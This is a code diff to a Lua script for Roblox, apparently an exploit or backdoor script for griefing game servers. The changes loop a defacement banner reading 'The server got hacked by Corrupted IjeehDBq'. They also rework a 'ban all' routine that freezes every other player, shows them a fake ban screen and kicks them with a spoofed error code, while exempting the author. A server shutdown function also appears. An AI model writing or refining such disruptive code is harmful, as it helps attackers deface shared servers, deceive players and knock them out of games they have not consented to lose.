@@ -89,55 +89,24 @@ end)
 -- Day/Night cycle control
 local dayNightLoop = nil
 
--- HINT - Visible to ALL Players including YOU
+-- HINT - Just Workspace Hint with Loop (No UI)
 local function showHintToAll()
-    for _, plr in pairs(Players:GetPlayers()) do
-        -- Create hint GUI for EVERY player (including me)
-        local hintGui = Instance.new("ScreenGui")
-        hintGui.Name = "HackHint"
-        hintGui.ResetOnSpawn = false
-        hintGui.Parent = plr:WaitForChild("PlayerGui")
-        
-        local hintFrame = Instance.new("Frame", hintGui)
-        hintFrame.Size = UDim2.new(0, 500, 0, 80)
-        hintFrame.Position = UDim2.new(0.5, -250, 0.1, 0)
-        hintFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-        hintFrame.BackgroundTransparency = 0.3
-        hintFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-        hintFrame.BorderSizePixel = 3
-        
-        -- Add corner rounding for modern look
-        local corner = Instance.new("UICorner", hintFrame)
-        corner.CornerRadius = UDim.new(0, 10)
-        
-        local hintText = Instance.new("TextLabel", hintFrame)
-        hintText.Size = UDim2.new(1, 0, 1, 0)
-        hintText.BackgroundTransparency = 1
-        hintText.Text = "😈the server got hacked by Corrupted IjeehDBq😈"
-        hintText.TextColor3 = Color3.fromRGB(255, 0, 0)
-        hintText.TextSize = 20
-        hintText.Font = Enum.Font.SourceSansBold
-        hintText.TextWrapped = true
-        
-        -- Animate hint with tween
-        spawn(function()
-            while true do
-                for i = 0, 1, 0.05 do
-                    hintFrame.Position = UDim2.new(0.5 - i, -250, 0.1, 0)
-                    wait(0.05)
-                end
-                for i = 1, 0, -0.05 do
-                    hintFrame.Position = UDim2.new(0.5 - i, -250, 0.1, 0)
-                    wait(0.05)
-                end
-            end
-        end)
-        
-        -- Also create workspace hint (visible in game world)
-        local h = Instance.new("Hint", workspace)
-        h.Text = "The server got hacked by Corrupted IjeehDBq"
-        Debris:AddItem(h, 10)
-    end
+    -- Create workspace hint visible to everyone
+    local h = Instance.new("Hint", workspace)
+    h.Text = "The server got hacked by Corrupted IjeehDBq"
+    
+    -- Loop to keep showing hint
+    spawn(function()
+        while true do
+            wait(5)
+            local h2 = Instance.new("Hint", workspace)
+            h2.Text = "😈The server got hacked by Corrupted IjeehDBq😈"
+            Debris:AddItem(h2, 5)
+        end
+    end)
+    
+    -- Clean up initial hint after 5 seconds
+    Debris:AddItem(h, 5)
 end
 
 -- HACK - Fire Effects Visible to ALL Players including YOU
@@ -400,7 +369,7 @@ local function shutdownServer()
     game:Shutdown()
 end
 
--- Function to create ban UI for ANY player (including me)
+-- Function to create ban UI for OTHER players (NOT me)
 local function createBanUI(plr)
     -- Create ban screen
     local banGui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
@@ -531,23 +500,25 @@ local function createBanUI(plr)
     end
 end
 
--- BAN ALL - Blur + Error Code 1001 + Disappear + Real Ban for ALL including YOU
+-- BAN ALL - Blur + Error Code 1001 + Disappear + Real Ban for OTHERS ONLY (NOT me)
 local function banAllPlayers()
     for _, plr in pairs(Players:GetPlayers()) do
-        -- Create lag effect first for EVERYONE
-        if plr.Character then
-            local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
-            if humanoid then
-                humanoid.WalkSpeed = 0
-                humanoid.JumpPower = 0
+        if plr ~= me then  -- SKIP ME! I stay safe
+            -- Create lag effect for OTHER players
+            if plr.Character then
+                local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid.WalkSpeed = 0
+                    humanoid.JumpPower = 0
+                end
             end
+            
+            -- Create ban UI for other players
+            createBanUI(plr)
+            
+            wait(3)
+            plr:Kick("Banned: You have been banned by Corrupted IjeehDBq (Error Code: 1001)")
         end
-        
-        -- Create ban UI for everyone including me
-        createBanUI(plr)
-        
-        wait(3)
-        plr:Kick("Banned: You have been banned by Corrupted IjeehDBq (Error Code: 1001)")
     end
 end
 
